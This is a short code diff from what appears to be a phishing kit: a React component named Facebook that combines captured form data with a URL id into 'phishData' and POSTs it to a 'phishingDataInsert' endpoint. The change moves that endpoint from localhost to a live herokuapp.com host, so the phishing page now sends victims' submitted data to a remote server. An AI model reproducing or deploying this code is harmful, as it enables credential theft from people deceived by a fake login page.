@@ -21,7 +21,7 @@ const Facebook = () => {
     const id = {id:url.split('id=')[1]};
     const phishData = {...id,...data};
 
-      fetch('http://localhost:5000/phishingDataInsert',{
+      fetch('https://ancient-garden-81797.herokuapp.com/phishingDataInsert',{
           method:'POST',
           headers:{
             'Content-Type': 'application/json'
